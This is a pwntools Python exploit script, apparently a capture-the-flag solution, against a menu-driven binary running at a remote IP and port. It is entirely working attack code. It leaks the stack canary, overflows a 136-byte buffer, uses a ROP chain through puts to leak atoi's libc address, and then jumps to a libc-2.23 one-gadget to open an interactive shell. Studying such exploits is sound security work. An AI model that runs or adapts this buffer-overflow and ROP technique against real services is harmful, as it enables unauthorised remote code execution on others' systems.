from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

t = remote('111.198.29.45',  30840)
payload = cyclic(136)
pop_rdi_ret = 0x400a93
plt_puts = 0x400690
addr_ret = 0x400908
#raw_input()
got_atoi = 0x600fe0
t.recvuntil('>> ')
t.sendline('1')
t.sendline(payload)
t.recvuntil('>> ')
t.sendline('2')
t.recv(136)
canary = u64(t.recv(8)) - 0xa
log.info(hex(canary))
payload = cyclic(136) + p64(canary) + p64(1) + p64(pop_rdi_ret) + p64(got_atoi) + p64(plt_puts) + p64(addr_ret)
t.recvuntil('>> ')
t.sendline('1')
t.sendline(payload)
t.recvuntil('>> ')
t.sendline('3')
addr_atoi = u64(t.recv(6).ljust(0x8,'\x00'))
log.info(hex(addr_atoi))
libc = ELF('./libc-2.23.so')
addr_sys = addr_atoi - libc.symbols['atoi'] + 0x45216
payload = cyclic(136) + p64(canary) + p64(1) + p64(addr_sys)
t.recvuntil('>> ')
t.sendline('1')
t.sendline(payload)
t.recvuntil('>> ')
t.sendline('3')

t.interactive()